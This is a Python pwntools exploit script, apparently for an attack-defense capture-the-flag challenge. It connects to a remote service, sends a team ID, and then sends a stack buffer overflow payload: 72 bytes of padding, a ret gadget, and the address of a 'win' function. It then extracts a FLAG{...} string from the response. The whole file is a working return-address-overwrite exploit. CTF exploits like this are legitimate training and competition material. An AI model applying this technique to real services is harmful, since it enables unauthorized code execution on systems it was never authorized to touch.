#!/usr/bin/env python3

import re
import sys
import time

from pwn import ELF, context, p64, remote

from lib import get_target

context.log_level = "error"

ELF_PATH = "/opt/chall"
OFFSET = 72
FLAG_RE = re.compile(rb"FLAG\{[^\n\r}]*\}")


def main() -> int:
    host, port, team_id = get_target(sys.argv)
    team_id = team_id.encode()

    elf = ELF(ELF_PATH, checksec=False)
    context.binary = elf

    win = elf.symbols.get("win")
    if win is None:
        print("[!] missing win symbol", file=sys.stderr)
        return 2
    ret = next(elf.search(b"\xc3"))

    payload = b"A" * OFFSET + p64(ret) + p64(win)

    transcript = b""
    io = remote(host, port, timeout=5)
    try:
        transcript += io.recvuntil(b"TEAM ID?", timeout=5)
        io.sendline(team_id)
        transcript += io.recvuntil(b"Send your payload:", timeout=5)
        io.send(payload)
        transcript += io.recvall(timeout=5)
    finally:
        try:
            io.close()
        except Exception:
            pass

    m = FLAG_RE.search(transcript)
    if m:
        time.sleep(30)
        sys.stdout.buffer.write(m.group(0) + b"\n")
        sys.stdout.buffer.flush()
        time.sleep(30)
        return 0

    sys.stdout.buffer.write(transcript)
    if not transcript.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
